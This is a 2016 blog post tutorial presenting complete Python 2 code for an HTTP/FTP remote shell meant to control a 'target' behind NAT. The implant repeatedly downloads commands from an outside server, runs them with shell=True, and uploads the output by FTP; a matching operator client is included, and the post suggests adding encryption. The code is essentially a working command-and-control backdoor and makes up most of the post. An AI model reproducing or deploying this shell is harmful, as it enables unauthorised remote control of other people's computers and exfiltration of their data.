---
layout: post
title: "Useful Python Scripts: HTTP&FTP Shell"
date: 2016-04-25 18:00:00 +0200
categories: Scripting
tags:
  - scripting
  - shell
  - python
author: Joe Schmoe
---
Some people have problems with being unable to port forward, so they can't use reverse shells. Most of the time you can't use a bind shell either, if your target is behind NAT. What do!?  

## The Solution
What you can do is use a web server to transfer commands and outputs. So let's do just that!  

## The Server

We will need to use a few libraries:
{% highlight python linenos %}
import urllib2, ftplib, subprocess, StringIO, time, os
{% endhighlight %}
- urllib2: For downloading commands.
- ftplib: For uploading output.
- subprocess: For executing commands.
- StringIO: For turning strings into file objects. Why this is needed will be explained later.
- time: For sleeping.
  
Now that we have everything we need let's begin.  
  
{% highlight python linenos %}
import urllib2, ftplib, subprocess, StringIO, time
while True:
	try:
		command = urllib2.urlopen("http://server.com/input.txt").read()
	except Exception as e:
		print(str(e))
		time.sleep(20)
		
{% endhighlight %}

Seems pretty simple. We try downloading the input file, containing a command to execute. If there's an exception (No internet connection, input.txt doesn't exist, internet is on fire, etc.), we display it and wait 20 seconds before trying again. Now let's do something with the received command.

{% highlight python linenos %}
output = StringIO.StringIO(subprocess.check_output(command, shell=True))
{% endhighlight %}

We'll use subprocess the execute the command and get the output. Then, we will use StringIO to turn the command into a file object. Now let's upload the output to the FTP server.

{% highlight python linenos %}
ftp = ftplib.FTP("server.com")
ftp.login("username","password")
ftp.storbinary("STOR output.txt",output)
ftp.delete("input.txt")
ftp.quit()
ftp.close()
{% endhighlight %}

We create an FTP object and login to a server of our choosing. Then, we use the STOR command to store our output as output.txt. ftplib requires the second argument to be a file object, and that's why we needed to use StringIO earlier. After that, we delete the input file since it's no longer needed, and close our connection. The server is done!

{% highlight python linenos %}
import urllib2, ftplib, subprocess, StringIO, time, os
while True:
	try:
		command = urllib2.urlopen("http://server.com/input.txt").read()
		output = StringIO.StringIO(subprocess.check_output(command, shell=True))
		ftp = ftplib.FTP("server.com")
		ftp.login("username","password")
		ftp.storbinary("STOR output.txt",output)
		ftp.delete("input.txt")
		ftp.quit()
		ftp.close()
	except Exception as e:
		print str(e)
		time.sleep(20)
{% endhighlight %}

**The Client**

The client is very analogous to the server, so I don't think there's much to explain.

{% highlight python linenos %}
import urllib2, ftplib, time
while True:
	try:
		command = StringIO.StringIO(raw_input())
		
		ftp = ftplib.FTP("server.com")
		ftp.login("username","password")
		ftp.storbinary("STOR input.txt",command)
		try: ftp.delete("output.txt")
		except: pass
		ftp.quit()
		ftp.close()
		while True:
			try:
				output = urllib2.urlopen("http://server.com/output.txt").read()
				break
			except:
				time.sleep(5)
				continue
			
		print output
	except Exception as e:
		print str(e)
{% endhighlight %}

We get the command and turn it into a file object, upload it, and delete the previous output (The try/except is there because if output.txt doesn't exist ftplib raises an exception). Then we try reading the output every 5 seconds, and print it when we succeed.


Some suggestions for improving the script:
- Make it use HTTP/FTP only.
- Encrypt data before sending it.
- You need to append "cd <directory>" before every command, because subprocess always uses the current directory. Perhaps you can make the script change the current working directory?
- Show current directory and a prompt.


Hope you enjoyed this article!  
Joe Schmoe
